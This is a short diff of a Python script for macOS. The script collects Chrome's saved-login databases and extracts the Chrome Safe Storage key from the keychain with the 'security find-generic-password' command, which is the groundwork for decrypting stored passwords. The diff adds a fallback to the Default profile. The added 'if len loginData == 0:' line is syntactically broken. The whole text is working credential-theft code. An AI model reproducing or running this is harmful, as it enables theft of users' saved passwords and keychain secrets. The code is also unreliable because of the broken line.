@@ -1,6 +1,8 @@
 import sqlite3, os, binascii, subprocess, base64, sys, hashlib, glob
 
 loginData = glob.glob("%s/Library/Application Support/Google/Chrome/Profile*/Login Data" % os.path.expanduser("~"))
+if len loginData == 0:
+    loginData = glob.glob("%s/Library/Application Support/Google/Chrome/Default/Login Data" % os.path.expanduser("~")) #attempt default profile
 safeStorageKey = subprocess.check_output("security 2>&1 > /dev/null find-generic-password -ga 'Chrome' | awk '{print $2}'", shell=True).replace("\n", "").replace("\"", "")
 if safeStorageKey == "":
     print "ERROR getting Chrome Safe Storage Key"
